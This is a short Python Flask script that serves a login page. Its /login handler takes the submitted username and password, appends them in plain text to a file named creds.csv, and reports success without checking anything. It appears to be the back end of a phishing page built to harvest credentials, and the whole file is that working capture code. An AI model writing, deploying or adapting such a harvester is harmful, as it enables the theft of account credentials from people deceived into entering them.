from flask import Flask,redirect,request,render_template,jsonify
import csv

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("login.html")

@app.route("/login",methods=["POST"])
def login():
    username=request.json.get("username")
    password=request.json.get("password")
    with open('creds.csv', 'a+') as file:
        csvWriter=csv.writer(file)
        csvWriter.writerow([username,password])
    return jsonify({
        "status":"success"
    })

app.run()